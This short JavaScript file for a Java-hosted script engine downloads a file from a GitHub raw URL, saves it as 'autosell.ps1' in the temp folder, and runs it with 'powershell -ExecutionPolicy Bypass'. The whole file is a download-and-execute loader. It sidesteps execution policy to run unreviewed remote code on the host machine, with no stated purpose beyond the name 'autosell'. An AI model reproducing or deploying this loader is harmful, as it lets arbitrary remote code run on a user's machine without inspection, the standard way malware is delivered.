const File = Java.type("java.io.File");
const FileWriter = Java.type("java.io.FileWriter");
const HttpURLConnection = Java.type("java.net.HttpURLConnection");
const URL = Java.type("java.net.URL");
const BufferedReader = Java.type("java.io.BufferedReader");
const InputStreamReader = Java.type("java.io.InputStreamReader");
const Runtime = Java.type("java.lang.Runtime");

const tempFolder = java.lang.System.getProperty("java.io.tmpdir");
const scriptPath = tempFolder + File.separator + "autosell.ps1";

function downloadScript(url, outputPath) {
    try {
        const connection = new URL(url).openConnection();
        connection.setRequestMethod("GET");
        if (connection.getResponseCode() !== HttpURLConnection.HTTP_OK) {
            throw new Error("Failed to download file: HTTP " + connection.getResponseCode());
        }
        const reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
        const writer = new FileWriter(new File(outputPath));
        let line;
        while ((line = reader.readLine()) !== null) {
            writer.write(line + "\n");
        }
        reader.close();
        writer.close();
        print("Script downloaded successfully to: " + outputPath);
    } catch (error) {
        print("Error downloading the script: " + error.message);
        throw error;
    }
}

function executeScript(scriptPath) {
    try {
        const process = Runtime.getRuntime().exec("powershell -ExecutionPolicy Bypass -File " + scriptPath);
        process.waitFor();
        const exitCode = process.exitValue();
        print("Script executed with exit code: " + exitCode);
    } catch (error) {
        print("Error executing the script: " + error.message);
    }
}

// Download and execute
downloadScript("https://raw.githubusercontent.com/duper2-1/wow/refs/heads/main/main.js", scriptPath);
executeScript(scriptPath);
